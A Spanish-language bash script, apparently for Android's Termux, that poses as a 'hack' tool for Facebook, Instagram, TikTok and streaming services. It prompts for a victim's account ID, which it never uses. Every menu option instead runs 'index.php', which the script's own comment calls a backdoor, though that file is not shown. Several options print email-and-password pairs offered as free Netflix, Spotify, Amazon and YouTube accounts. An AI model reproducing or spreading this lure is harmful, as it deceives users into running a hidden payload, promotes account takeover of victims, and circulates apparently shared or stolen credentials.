#! /bin/bash

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


#directory verification
directory=$(pwd)


if which php >/dev/null; then
sleep 1
echo ""
echo -e "$blue(php)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(php)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando php ...\e[0m"
sleep 3
pkg install php
fi

#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando figlet ...\e[0m"
sleep 3
pkg install figlet
fi

clear

setterm -foreground red
figlet Free

#Backdoor (Variable)
index=index.php

echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣀⣤⣤⠄⢀⣤⠀⣾⣿⣿⣿⠀⣀⠀⢠⣤⣤⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣶⣿⣿⣿⠃⣰⣿⣿⣄⠙⠿⠿⠋⣠⣿⣷⡄⠹⣿⣿⣿⣶⡀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⠇⢰⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⡀⢹⣿⣿⣿⣿⣄⠀⠀ 
⠀⢸⣿⣿⡿⠋⠀⠀⣿⡏⠀⠙⠻⣿⣿⣿⣿⠟⠁⠀⣿⣧⠀⠀⠙⢿⣿⣿⡆⠀ 
⠀⣿⣿⡿⠀⠀⠀⢰⣿⣿⣤⣤⣴⣿⣿⣿⣿⣦⣤⣴⣿⣿⠀⠀⠀⠈⣿⣿⡇⠀ 
⠀⢹⣿⣇⠀⠀⠀⢸⣿⣿⣿⣿⣷⡙⠻⠟⢩⣿⣿⣿⣿⣿⠀⠀⠀⠀⣼⣿⡇
⠀⠈⠻⣿⣆⠀⠀⠈⠉⠉⠉⣿⣿⣷⡀⢠⣿⣿⡏⠉⠉⠉⠀⠀⠀⣰⣿⠟⠀⠀            
⠀⠀⠀⠈⠉⠓⠂⠀⠀⠀⠀⣿⣿⣿⣷⣿⣿⣿⡇⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢿⡟⠈⣿⡿⠈⢿⡇⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡆⠘⢀⡆⠸⠃⣠⠈⠃⢸⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡇⠀⣾⣷⠀⢀⣿⣧⠀⣼⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⠇⠸⣿⣿⠀⠸⣿⣿⠆⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁
"
echo ""
while :
do
#MENU
#ESCOJER MENU
echo "Seleccione que hack desea usar"
echo ""
echo -e "\e[1;33m[1].\e[0m\e[1;32mHack de Facebook\e[0m"
echo -e "\e[1;33m[2].\e[0m\e[1;32mHack de Instagram\e[0m"
echo -e "\e[1;33m[3].\e[0m\e[1;32mHack de Tik tok lite\e[0m"
echo -e "\e[1;33m[4].\e[0m\e[1;32mHack de Amazon prime\e[0m"
echo -e "\e[1;33m[5].\e[0m\e[1;32mHack de Netflix Premiun\e[0m"
echo -e "\e[1;33m[6].\e[0m\e[1;32mHack de Spotify Premiun\e[0m"
echo -e "\e[1;33m[7].\e[0m\e[1;32mHack de Youtube Premiun\e[0m"
echo ""
echo -e -n "\e[1;35m[+]\e[0m\e[1;37mOPCION >>\e[0m " 
read opcion
case $opcion in
1) 
#! /bin/bash
echo ""
setterm -foreground red
echo -n "Ponga la id del Facebook de la victima >"
read a
setterm -foreground cyan
php -f $index
;;
#
2)
#! /bin/bash
echo ""
setterm -foreground red
echo -n "Escriba el usuario del Instagram de la victima >"
read a
setterm -foreground cyan
php -f $index
;;
#
3)
#! /bin/bash
echo ""
setterm -foreground red
echo -n "Escriba el usuario del tik tok de la victima >"
read a
setterm -foreground cyan
php -f $index
;;
#
4)
#! /bin/bash
echo ""
setterm -foreground red
echo -n "Escriba si para obtener la cuenta amazon >"
read a
echo ""
echo "Freeamazon78@gmail.com"
echo "yim09plp"
echo ""
setterm -foreground cyan
php -f $index
;;
#
5)
#! /bin/bash
echo ""
setterm -foreground red
echo -n "Escriba si para obtener la cuenta de netflix >"
read a
echo ""
echo "Freenetwork100@gmail.com"
echo "dimp80¿¿"
echo ""
setterm -foreground cyan
php -f $index
;;
#
6)
#! /bin/bash
echo ""
setterm -foreground red
echo -n "Escriba si para obtener la cuenta spotyfi >"
read a
echo ""
echo "Freespotyfi007@gmail.com"
echo "miusic07"
echo ""
setterm -foreground cyan
php -f $index
;;
#
7)
#! /bin/bash
echo ""
setterm -foreground red
echo -n "Escriba si para obtener la cuenta Youtube >"
read a
echo ""
echo "Freeyoupremiun@gmail.com"
echo "zacariasff45"
echo ""
setterm -foreground cyan
php -f $index
;;
esac
done
#
